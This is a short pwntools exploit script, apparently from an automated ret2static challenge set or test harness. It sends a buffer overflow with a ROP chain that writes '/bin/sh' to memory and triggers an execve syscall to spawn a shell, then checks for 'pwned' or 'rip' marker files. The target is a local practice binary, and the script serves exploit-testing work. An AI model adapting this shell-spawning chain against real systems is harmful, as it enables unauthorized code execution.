from pwn import *

import os
import sys
import signal

target = process("./chall-test_ret2static-0-x64")
gdb.attach(target, gdbscript="verify_exploit_static")

payload =  ""
payload += "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p64(0x40186a)
payload += p64(0x4bb000)
payload += p64(0x40176f)
payload += "/bin/sh\x00"
payload += p64(0x433d23)
payload += p64(0x449457)
payload += p64(0x3b)
payload += p64(0x40186a)
payload += p64(0x4bb000)
payload += p64(0x40f4fe)
payload += p64(0x0)
payload += p64(0x40176f)
payload += p64(0x0)
payload += p64(0x4012d3)
target.sendline(payload)

# Exploit Verification starts here

class ExploitTimedOut(Exception):
	pass

def timeOut(signum, frame):
	raise ExploitTimedOut()

signal.signal(signal.SIGALRM, timeOut)
signal.alarm(2)

try:
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)
except ExploitTimedOut:
	print("Exploit timed out")
